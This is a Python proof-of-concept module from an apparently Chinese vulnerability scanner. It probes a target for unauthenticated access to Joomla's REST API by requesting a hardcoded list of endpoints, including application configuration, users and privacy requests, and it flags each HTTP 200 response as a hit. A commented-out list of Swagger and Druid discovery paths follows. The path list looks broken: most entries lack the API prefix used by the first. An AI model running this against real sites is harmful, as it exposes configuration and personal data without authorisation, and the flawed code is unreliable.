# -*- coding: utf-8 -*-

from poc import core
def check(url):
	name= 'joomla未授权访问'
	core.start_echo(name)
	use = ["/api/index.php/v1/banners?public=true","v1/banners","v1/banners/clients","v1/banners/categories","v1/config/application","v1/contacts","v1/contacts/categories","v1/fields/contacts/contact","v1/fields/contacts/mail","v1/fields/contacts/categories","v1/fields/groups/contacts/contact","v1/fields/groups/contacts/mail","v1/fields/groups/contacts/categories","v1/content/articles","v1/content/categories","v1/fields/content/articles","v1/fields/content/categories","v1/fields/groups/content/articles","v1/fields/groups/content/categories","v1/extensions","v1/languages/content","v1/languages/overrides/search","v1/languages/overrides/search/cache/refresh","v1/languages/overrides/site/zh-CN","v1/languages/overrides/administrator/zh-CN","v1/languages/overrides/site/en-GB","v1/languages/overrides/administrator/en-GB","v1/languages","v1/media/adapters","v1/media/files","v1/menus/site","v1/menus/administrator","v1/menus/site/items","v1/menus/administrator/items","v1/menus/site/items/types","v1/menus/administrator/items/types","v1/messages","v1/modules/types/site","v1/modules/types/administrator","v1/modules/site","v1/modules/administrator","v1/newsfeeds/feeds","v1/newsfeeds/categories","v1/plugins","v1/privacy/requests","v1/privacy/requests/export/","v1/privacy/requests","v1/privacy/consents","v1/redirects","v1/tags","v1/templates/styles/site","v1/templates/styles/administrator","v1/users","v1/fields/users","v1/fields/groups/users","v1/users/groups","v1/users/levels"]
	for i in range(0,57):
		path=use[i]
		r=core.get(url,path)
		if r:
			if r.status_code==200:
				core.end_echo(name,'Payload：'+url+'/'+path)
				core.result(name,url+'/'+path)
			else:
				# core.end_echo(name)
				pass
		else:
			core.end_echo(name)


# use = ["/v2/api-docs", "/swagger-ui.html", "/swagger", "/api/swagger", "/Swagger/ui/index", "/api/swaggerui",
# 	   "/swagger/ui", "/api/swagger/ui", "/api/swagger-ui.html", "/user/swagger-ui.html", "/libs/swaggerui",
# 	   "/swagger/index.html", "/swagger-resources/configuration/ui", "/swagger-resources/configuration/security",
# 	   "/api.html", "/druid/index.html", "/sw/swagger-ui.html", "/api/swagger-ui.html", "/template/swagger-ui.html",
# 	   "/spring-security-rest/api/swagger-ui.html", "/spring-security-oauth-resource/swagger-ui.html",
# 	   "/swagger/v1/swagger.json", "/swagger/v2/swagger.json", "/api-docs", "/api/doc", "/docs/", "/doc.html",
# 	   "/v1/api-docs", "/v3/api-docs"]
# path=use[0]
# print(path)